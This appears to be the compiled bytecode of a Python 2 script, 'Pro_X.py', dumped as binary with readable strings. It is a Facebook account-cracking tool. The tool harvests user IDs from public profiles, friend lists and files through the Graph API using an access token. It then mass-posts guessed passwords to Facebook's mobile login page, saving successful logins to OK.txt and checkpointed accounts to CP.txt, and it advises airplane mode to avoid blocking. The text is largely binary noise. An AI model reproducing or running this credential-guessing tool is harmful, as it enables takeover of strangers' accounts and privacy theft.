 d d  }	 |	 j | d 	 d  |	 j    j | 	  nd | k rd | d 	 d GHt
 d  d  }
 |
 j | d 	 d  |
 j     j | 	  n©| j d d i | d 6
 d 6d d 6} | j	 } d | k såd | k r@d | d 
 d GHt
 d d  }	 |	 j | d 
 d  |	 j    j | 
  nd | k r§d | d 
 d GHt
 d  d  }
 |
 j | d 
 d  |
 j     j | 
  n| j d d i | d 6 d 6d d 6} | j	 } d | k sòd | k rMd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nöd | k r´d | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n| j d d i | d 6 d 6d d 6} | j	 } d | k sÿd | k rZd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   né
d | k rÁd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n
| j d d i | d 6 d 6d d 6} | j	 } d | k sd | k rgd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nÜ	d | k rÎd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   nu	| j d d i | d 6 d 6d d 6} | j	 } d | k sd | k rtd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nÏd | k rÛd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   nh| j d d i | d 6 d 6d d 6} | j	 } d | k s&d | k rd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nÂd | k rèd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n[| j d d i | d 6 d 6d d 6} | j	 } d | k s3	d | k r	d | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nµd | k rõ	d | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   nN| j d d i | d 6 d 6d d 6} | j	 } d | k s@
d | k r
d | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   n¨d | k rd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   nA| j d d i | d 6 d 6d d 6} | j	 } d | k sMd | k r¨d | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nd | k rd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n4| j d d i | d 6 d 6d d 6} | j	 } d | k sZd | k rµd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nd | k rd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n'| j d d i | d 6 d 6d d 6} | j	 } d | k sgd | k rÂd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   nd | k r)d | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n| j d d i | d 6 d 6d d 6} | j	 } d | k std | k rÏd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   ntd | k r6d | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n| j d d i | d 6 d 6d d 6} | j	 } d | k sd | k rÜd | d  d GHt
 d d  }	 |	 j | d  d  |	 j    j |   ng d | k rCd | d  d GHt
 d  d  }
 |
 j | d  d  |
 j     j |   n  Wn n Xd  S(!   NRA   s   mbasic.facebook.comRB   s	   max-age=0s   cache-controlR   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8RC   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   https://mbasic.facebook.coms%   https://mbasic.facebook.com/login.phpR)   RD   RE   RF   R   RG   s   save-devices   [1;92m[RISHU-SUCES] s    | s   [0;97ms   OK.txtRH   s   
RI   s   [1;91m[RISHU-CHECK] s   CP.txt(   RO   RP   R5   RQ   R   RR   R   RS   R-   RT   R   R#   R$   RU   (   RW   RX   R'   R,   RY   RZ   R[   R)   R]   R^   R_   (   Rg   Rh   R\   R~   R   R   R   R   R   R`   Ra   Rb   Rc   Rd   Re   Rf   R   (    s   Pro_X.pyRi     s¶   A*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

*	

i   s$   [1;37m[$] PROCESS HAS BEEN COMPLETEs   [1;37m[$] TOTAL OK : [1;32ms   [1;37m[$] TOTAL CP : [1;31ms    [1;37mPRESS ENTER TO BACK MENU (   R   R   R   R   R   R   R   R!   R"   R    R	   R5   Rj   RU   R   Rk   Rl   R
   R4   R   Rm   Rn   R    Ro   (   R   R?   Rp   R   R*   Rq   Rr   R'   Rs   Rt   Ru   Rv   Ri   Rw   (    (   Rg   Rh   R\   R~   R   R   R   R   R   R`   Ra   Rb   Rc   Rd   Re   Rf   R   s   Pro_X.pyR   1  sâ   















	



?ù
c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW d GHd GHt j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHt
   d  S(   NR   s   access_token.txtR   R   s   	Token not foundi   s   	     CRACK WITH SINGLE PASSs8   [1;97m-------------------------------------------------s   [1] CRACK PUBLIC IDs   [2] CRACK FOLLOWERSs   [3] CRACK MULTIPLE IDs   [4] FILE CLONINGs   [0] BACK(   R   R   R   R   R   R
   R%   R&   R   R   t   digit_rx(    (    (    s   Pro_X.pyR=     s&    c             sî  t  d  }  g  } g   g    |  d k r\t j d  t GHd GHd GHt  d  } yZ t j d | d t  } t j | j	  } t j d  t GHd GHd	 GHd
 | d GHWn, t
 k
 rÚ d GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x>| d D]B } | d } | d } | j d  d }	 | j | d |  qWní|  d k rt j d  t GHd GHd	 GHt  d  } yZ t j d | d t  } t j | j	  } t j d  t GHd GHd	 GHd
 | d GHWn, t
 k
 rd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x | d D]B } | d } | d } | j d  d }	 | j | d |  qQWn¯|  d k r8t j d  t GHd GHd	 GHyC t  d  }
 x0 t |
 d  j   D] } | j | j    qçWWqIt
 t f k
 r4d GHt  d  t   qIXn|  d k rt j d  t GHd GHd GHt  d  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 rËd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d } | j d  d }	 | j | d |  qWt  d  } y1 t j d | d t  } t j | j	  } Wn, t
 k
 rµd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d } | j d  d }	 | j | d |  qîWt  d   } y1 t j d | d t  } t j | j	  } Wn, t
 k
 rd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } xN | d D]B } | d } | d } | j d  d }	 | j | d |  qØWt  d!  } yC t j d | d t  } t j | j	  } t j d  t GHWn, t
 k
 rd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x} | d D]B } | d } | d } | j d  d }	 | j | d |  qÔWn, |  d" k r3t   n d GHd# GHd GHt   d$ t t |   GHd% GHd	 GHd& GHd' GH   f d(   } t d)  } | j | |  d	 GHd* GHd+ t t    GHd, t t     GHd	 GHt  d-  t   d  S(.   Ns   [?] Choose : R   R   s   	     SINGLE PASS CRACKINGs8   [1;37m-------------------------------------------------s   [?] INPUT ID : s   https://graph.facebook.com/s   ?access_token=s8   [1;97m-------------------------------------------------s   [+] CLONING FROM : [1;92mR,   s   	Invalid link OR tokenR   s   PRESS ENTER TO BACKs   /friends?access_token=R)   R?   R@   i    RA   R   s   	Invalid id link OR tokenR1   s   	     SINGLE PASS FILE CRACKs   [?] INPUT FILE NAME : [1;92mR   s+   	    [1;38mRequested file not found[0;98ms    Press enter to back R0   s   [1] INPUT ID : s   [2] INPUT ID : s   [3] INPUT ID : s   [4] INPUT ID : R3   s   	SELECT VALID OPTIONs   [1;97m[$] TOTAL IDS :[1;92m s"   [1;97m[$] THE PROCESS HAS STARTEDs1   [1;93m     USE FLIGHT (AIRPLANE) MODE BEFORE USEs9   [1;97m--------------------------------------------------c            sã  |  } | j  d  \ } } t j t  } t j   } | j j i d d 6d d 6d d 6| d 6d	 d
 6d d 6d d 6 d } yX| } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sÑ d |	 k r,d | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  n¨d |	 k rd | d | d GHt
 d  d  } | j | d | d  | j     j | |  nA| j   j  d!  d" d! | j   j  d!  d# } | j d d i | d 6| d 6d d 6} | j	 }	 d |	 k sd |	 k rmd | d | d GHt
 d d  }
 |
 j | d | d  |
 j    j | |  ng d |	 k rÔd | d | d GHt
 d  d  } | j | d | d  | j     j | |  n  Wn n Xd  S($   NRA   s   mbasic.facebook.comRB   s	   max-age=0s   cache-controlR   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8RC   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   https://mbasic.facebook.coms%   https://mbasic.facebook.com/login.phpR)   RD   RE   RF   R   RG   s   save-devices   [1;92m[RISHU-SUCES] s    | s   [0;97ms   OK.txtRH   s   
RI   s   [1;91m[RISHU-CHECK] s   CP.txtR@   i    i   (   RO   RP   R5   RQ   R   RR   R   RS   R-   RT   R   R#   R$   RU   RV   (   RW   RX   R'   R,   RY   RZ   R[   R\   R)   R]   R^   R_   R`   (   Rg   Rh   (    s   Pro_X.pyRi   Ë  sN    A*	

4*	

i   s$   [1;37m[$] PROCESS HAS BEEN COMPLETEs   [1;37m[$] TOTAL OK : [1;32ms   [1;37m[$] TOTAL CP : [1;31ms    [1;37mPRESS ENTER TO BACK MENU (   R   R   R   R   R   R   R   R!   R"   R    R	   R5   Rj   RU   R   Rk   Rl   R
   R4   R   Rm   Rn   R    Ro   (   t   rxR?   Rp   R   R*   Rq   Rr   R'   Rs   Rt   Ru   Rv   Ri   Rw   (    (   Rg   Rh   s   Pro_X.pyR   2  sB   















	



+
c          C   sÇ   t  j d  t GHd j d  GHd GHt d  }  t  j d  t GHd j d  GHd GHt d  } t  j d |  d	 |  t  j d  t GHd
 j d  GHd | j d  GHd GHt d  t   d  S(   NR   s4   	[1;37mINPUT FILE REMOVE DOUBLING (/sdcard/xx.txt) i2   s8   [1;97m-------------------------------------------------s   [?] INPUT FILE NAME : [1;32ms7   [1;37m[?] PUT FILE REMOVED ID OUTPUT (/sdcard/xx.txt) s%   [1;37mOUTPUT NEW FILE NAME : [0;97ms   sort -r s
    | uniq > s'   [1;32mREMOVED DOUBLING SUCCESSFULL :) s   [1;32mFile Save In /sdcard/s   PRESS ENTER TO BACK (   R   R   R   t   centerR   R   (   t   stt   fp(    (    s   Pro_X.pyR9     s$    
t   __main__(,   R   t   bs4t   sysR   t
   subprocessRP   R%   t   ret   base64R!   t   reloadt   setdefaultencodingt   multiprocessing.poolR    t   ImportErrorR   t	   mechanizeR[   RQ   R   R    Rl   t   ipt   upperR.   R   R   R   R   R   R   R/   R5   R;   R4   R>   R,   Rx   R<   R   R=   R   R9   t   __name__(    (    (    s   Pro_X.pyt   <module>   sX   <T
	>					)					ÿ 5		ÿ í		ÿ í		Ï	